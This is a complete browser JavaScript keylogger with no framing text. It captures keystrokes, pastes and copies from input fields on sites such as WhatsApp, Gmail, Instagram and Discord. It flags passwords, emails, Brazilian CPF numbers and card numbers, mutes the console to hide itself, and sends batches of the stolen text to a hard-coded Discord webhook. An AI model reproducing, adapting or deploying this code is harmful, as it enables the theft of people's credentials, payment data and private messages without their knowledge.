(function(){
'use strict';

if(window._k){
try{if(typeof window._k.kill==='function'){window._k.kill();}}catch(e){}
delete window._k;}

const _id='1528620856354537472';
const _token='EDrEckoSN7dgJzZjj8LTeaisf_SxMjkrcy5QQMijZS3QcDFrNSEkvWPQde2-0V4EugEy';
const _endpoint='https://discordapp.com/api/webhooks/'+_id+'/'+_token;
const _batchSize=12;
const _flushInterval=8000;
const _focusDebounce=300;
const _maxFieldLength=950;

let _store=[];
let _timer=null;
let _session=localStorage.getItem('_k_session')||(Math.random().toString(36).slice(2,10)+Date.now().toString(36));
localStorage.setItem('_k_session',_session);
let _isFlushing=false;
let _buffer='';
let _isCapturing=false;
let _targetTag='';
let _targetId='';
let _targetPlatform='';
let _isPassword=false;
let _lastKeyTime=0;
let _msgCount=parseInt(localStorage.getItem('_k_count')||'0',10);
let _focusTimer=null;

const _noop=function(){};
const _orig={
log:console.log,
warn:console.warn,
error:console.error,
info:console.info,
debug:console.debug
};
console.log=_noop;
console.warn=_noop;
console.error=_noop;
console.info=_noop;
console.debug=_noop;

const _PLATFORM_EMOJI={
'WhatsApp':'📱','Habblive':'🎮','Instagram':'📷','Telegram':'✈️',
'Discord':'💬','Facebook':'📘','Twitter':'🐦','Gmail':'📧',
'Outlook':'📨','YouTube':'▶️'
};

function _ts(){
return new Date().toISOString().replace('T',' ').slice(0,19);}
function _now(){
return Date.now();}
function _simpleHash(str,len){
len=len||8;
let h=5381;
for(let i=0;i<str.length;i++){h=((h<<5)+h)+str.charCodeAt(i);h=h&h;}
return(h>>>0).toString(16).toUpperCase().slice(0,len);}

function _getPlatform(){
const u=document.URL;
if(u.includes('habblive')||u.includes('habblet'))return'Habblive';
if(u.includes('whatsapp')||u.includes('web.whatsapp'))return'WhatsApp';
if(u.includes('instagram'))return'Instagram';
if(u.includes('telegram'))return'Telegram';
if(u.includes('discord'))return'Discord';
if(u.includes('facebook'))return'Facebook';
if(u.includes('twitter')||u.includes('x.com'))return'Twitter';
if(u.includes('gmail')||u.includes('mail.google'))return'Gmail';
if(u.includes('outlook')||u.includes('live.com'))return'Outlook';
if(u.includes('youtube'))return'YouTube';
return'Web';}

function _chunkArray(arr,size){
const r=[];
for(let i=0;i<arr.length;i+=size)r.push(arr.slice(i,i+size));
return r;}

function _detectSensitive(txt,tag,isPw){
const flags=[];
if(isPw)flags.push('🔐 Senha');
if(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(txt))flags.push('📧 Email');
if(/\d{3}\.\d{3}\.\d{3}-\d{2}/.test(txt))flags.push('🪪 CPF');
if(/\b(?:\d[ -]*?){13,16}\b/.test(txt)&&/\d{4}/.test(txt))flags.push('💳 Cartão');
return flags;}

function _clearFocusTimer(){
if(_focusTimer){clearTimeout(_focusTimer);_focusTimer=null;}}

function _submitMessage(force){
_clearFocusTimer();
if(_buffer.trim().length===0){_resetCapture();return;}
_msgCount++;
localStorage.setItem('_k_count',_msgCount.toString());
const flags=_detectSensitive(_buffer,_targetTag,_isPassword);
_push('msg',{
seq:_msgCount,
txt:_buffer.trim(),
platform:_targetPlatform||_getPlatform(),
emoji:_PLATFORM_EMOJI[_targetPlatform]||'🌐',
ctx:_targetTag+(_targetId?'#'+_targetId:''),
sensitive:flags,
ts:_ts()
});
_resetCapture();}

function _resetCapture(){
_buffer='';
_isCapturing=false;
_targetTag='';
_targetId='';
_targetPlatform='';
_isPassword=false;}

function _push(type,data){
_store.push({ty:type,d:data});
if(_store.length>=_batchSize&&!_isFlushing)_flush();}

function _buildEmbed(events){
const fields=[];
const hash=_simpleHash(_session+events[0].d.ts||_ts(),8);

events.forEach(function(e){
if(e.ty==='msg'){
const d=e.d;
const flagStr=d.sensitive&&d.sensitive.length?' '+d.sensitive.join(' '):'';
const header=d.emoji+' 💬 #'+d.seq+' • '+d.ts.slice(11,19)+flagStr;
let value=d.txt;
if(value.length>900)value=value.slice(0,900)+'…';
fields.push({name:header,value:'```\n'+value+'\n```',inline:false});}
else if(e.ty==='copy'){
const d=e.d;
const short=d.txt.slice(0,400)+(d.txt.length>400?'…':'');
fields.push({name:'📋 Cópia • '+d.ts.slice(11,19),value:'```\n'+short+'\n```',inline:false});}
else if(e.ty==='paste'){
const d=e.d;
const short=d.txt.slice(0,400)+(d.txt.length>400?'…':'');
fields.push({name:'📥 Colagem • '+d.ts.slice(11,19)+' ('+d.len+' chars)',value:'```\n'+short+'\n```',inline:false});}
else if(e.ty==='nav'){
const d=e.d;
fields.push({name:'🧭 '+d.title+' • '+d.ts.slice(11,19),value:d.url,inline:false});}
});

const summary='📊 '+events.length+' eventos • Sessão '+_session.slice(0,8);
return{
embeds:[{
color:0x2b2d31,
title:'📡 #'+hash,
description:summary,
fields:fields.slice(0,25),
footer:{text:'Session '+_session+' • '+_ts()},
timestamp:new Date().toISOString()
}]
};}

function _send(events){
if(!events||!events.length)return;
if(_isFlushing)return;
_isFlushing=true;
try{
const payload=_buildEmbed(events);
fetch(_endpoint,{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify(payload),
keepalive:true
}).catch(_noop).finally(function(){_isFlushing=false;});
}catch(_){_isFlushing=false;}}

function _flush(){
if(!_store.length)return;
_send(_store.splice(0,_store.length));}

function _handleKeyDown(e){
_clearFocusTimer();
const key=e.key;
const target=e.target;
if(!target||(target.tagName!=='INPUT'&&target.tagName!=='TEXTAREA'&&!target.isContentEditable))return;

if(key==='Enter'&&!e.shiftKey){
e.preventDefault();
_submitMessage(true);
return;}

if(key==='Escape'){
_resetCapture();
_clearFocusTimer();
return;}

if(key==='Backspace'){
if(_isCapturing)_buffer=_buffer.slice(0,-1);
return;}

if(key.length===1&&!e.ctrlKey&&!e.metaKey&&!e.altKey){
if(!_isCapturing){
_isCapturing=true;
_targetTag=target.tagName;
_targetId=target.id||'';
_targetPlatform=_getPlatform();
_isPassword=target.type==='password';
_buffer='';}
_buffer+=key;
_lastKeyTime=_now();
return;}}

function _handleFocusOut(e){
const target=e.target;
if(!target||(target.tagName!=='INPUT'&&target.tagName!=='TEXTAREA'&&!target.isContentEditable))return;
if(!_isCapturing)return;

_clearFocusTimer();
_focusTimer=setTimeout(function(){
if(_isCapturing&&_buffer.trim().length>2){
_submitMessage(true);
}else{
_resetCapture();}
},_focusDebounce);}

function _handlePaste(e){
const target=e.target;
if(!target||(target.tagName!=='INPUT'&&target.tagName!=='TEXTAREA'&&!target.isContentEditable))return;
const txt=e.clipboardData&&e.clipboardData.getData('text/plain');
if(!txt)return;

_clearFocusTimer();
if(!_isCapturing){
_isCapturing=true;
_targetTag=target.tagName;
_targetId=target.id||'';
_targetPlatform=_getPlatform();
_isPassword=target.type==='password';
_buffer='';}
_buffer+=txt;
_push('paste',{txt:txt.slice(0,500),len:txt.length,ts:_ts()});}

function _trackCopy(e){
const txt=window.getSelection().toString().trim();
if(txt&&txt.length>0){
_push('copy',{txt:txt.slice(0,500),len:txt.length,ts:_ts()});}}

function _heartbeat(){
_push('heartbeat',{online:true,url:document.URL});}

function _staleCheck(){
if(_isCapturing&&_buffer.length>0&&(_now()-_lastKeyTime)>30000){
_submitMessage(true);}}

function _init(){
document.addEventListener('keydown',_handleKeyDown,true);
document.addEventListener('focusout',_handleFocusOut,true);
document.addEventListener('paste',_handlePaste,true);
document.addEventListener('copy',_trackCopy,true);
_timer=setInterval(_flush,_flushInterval);
setInterval(_heartbeat,300000);
setInterval(_staleCheck,10000);
window.addEventListener('beforeunload',function(){_clearFocusTimer();_flush();});

window._k={
kill:function(){
_clearFocusTimer();
clearInterval(_timer);
_timer=null;
_flush();
document.removeEventListener('keydown',_handleKeyDown,true);
document.removeEventListener('focusout',_handleFocusOut,true);
document.removeEventListener('paste',_handlePaste,true);
document.removeEventListener('copy',_trackCopy,true);
console.log=_orig.log;
console.warn=_orig.warn;
console.error=_orig.error;
console.info=_orig.info;
console.debug=_orig.debug;
delete window._k;},
flush:function(){_flush();}
};}

if(document.readyState==='complete'||document.readyState==='interactive'){
setTimeout(_init,0);}else{
document.addEventListener('DOMContentLoaded',function(){setTimeout(_init,0);});}
setTimeout(function(){if(!window._k)_init();},3000);

})();
